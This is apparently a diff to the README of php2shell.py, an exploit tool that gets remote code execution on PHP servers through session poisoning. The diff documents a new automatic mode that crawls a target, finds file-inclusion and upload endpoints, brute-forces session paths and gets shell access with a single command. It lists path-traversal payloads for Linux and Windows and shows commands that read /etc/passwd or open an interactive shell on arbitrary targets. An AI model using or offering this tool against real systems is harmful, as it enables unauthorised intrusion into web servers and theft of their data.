@@ -176,21 +176,47 @@ session.use_only_cookies = 0            # Allow session ID from cookies
 
 ### php2shell.py — Session Poisoning RCE
 
+**v2.0** introduces fully automatic LFI discovery. The exploit crawls the target, tests parameters for file inclusion, finds upload endpoints, brute-forces session paths, and chains everything together — no manual endpoint specification needed.
+
 ```
-usage: php2shell.py [-h] -t TARGET [-c CMD | --shell | --check]
+usage: php2shell.py [-h] -t TARGET [-c CMD | --shell | --check | --scan]
                     [--cmds CMD [CMD ...]] [--cmd-file FILE]
-                    [--session-path PATH] [--inject-endpoint EP]
-                    [--lfi-endpoint EP] [--race] [--threads N]
-                    [--attempts N] [--proxy URL] [-o FILE] [-v] [-q]
+                    [--inject-endpoint EP] [--lfi-endpoint EP]
+                    [--session-path PATH] [--race] [--threads N]
+                    [--attempts N] [--proxy URL] [--scan-threads N]
+                    [-o FILE] [--json] [-v] [-q]
 ```
 
-#### Single Command
+#### Auto Mode (Default)
+
+The default mode when no `--lfi-endpoint` is specified. Runs the full 5-step chain:
+
+1. **Recon** — fingerprints PHP version, OS, session config
+2. **LFI Discovery** — crawls for parameterized URLs, tests 30+ LFI parameter names with path traversal / filter payloads
+3. **Upload Endpoint Discovery** — crawls forms and brute-forces common upload paths
+4. **Session Path Enumeration** — tries 15+ common paths (Linux + Windows)
+5. **Exploitation** — iterates all LFI × upload × session path combinations
 
 ```bash
+# Auto scan + exploit (one command does everything)
+python3 exploit/php2shell.py -t http://target -c "id"
+
+# Against the lab
 python3 exploit/php2shell.py -t http://localhost:8080 -c "cat /etc/passwd"
 ```
 
+#### LFI Scan Only
+
+Scan without exploitation — useful for reconnaissance:
+
+```bash
+python3 exploit/php2shell.py -t https://target.example.com --scan
+python3 exploit/php2shell.py -t https://target.example.com --scan --json
+```
+
 #### Interactive Shell
+
+Automatically discovers LFI and endpoints, then drops into a shell:
 
 ```bash
 python3 exploit/php2shell.py -t http://localhost:8080 --shell
@@ -241,17 +267,30 @@ python3 exploit/php2shell.py -t http://localhost:8080 -c "id" \
   --proxy http://127.0.0.1:8081
 ```
 
-#### Custom Endpoints
+#### Manual Mode (Skip Auto-Discovery)
 
-For targets where the LFI and upload endpoints differ from the lab defaults:
+For targets where you already know the LFI and upload endpoints:
 
 ```bash
 python3 exploit/php2shell.py -t https://target.example.com \
   --inject-endpoint "/contact.php" \
-  --lfi-endpoint "/page.php" \
+  --lfi-endpoint "/page.php?file=" \
   --session-path "/tmp" \
   -c "id"
 ```
+
+### Auto-Discovery Details
+
+The LFI scanner tests the following:
+
+| Category | Examples |
+|---|---|
+| **Parameters** | `file`, `page`, `include`, `path`, `doc`, `template`, `lang`, `view`, `content`, `module`, `load`, `action`, `url`, `dir`, `folder`, `read`, `filename` (30+ total) |
+| **Traversal (Linux)** | `../../../etc/passwd`, `....//....//etc/passwd`, `..%2f` encoding, double encoding, `php://filter` |
+| **Traversal (Windows)** | `..\..\..\windows\win.ini`, `..%5c` encoding, `C:\xampp\tmp`, `C:\Windows\Temp` |
+| **Detection** | `root:x:0:0` (Linux), `; for 16-bit app support` (Windows), base64-decoded php://filter output |
+| **Session Paths** | `/var/lib/php/sessions`, `/tmp`, `/var/tmp`, `C:\Windows\Temp`, `C:\xampp\tmp` (15+ total) |
+| **Upload Endpoints** | Form crawling (`enctype="multipart/form-data"`), brute-force of 20+ common paths |
 
 ---
 
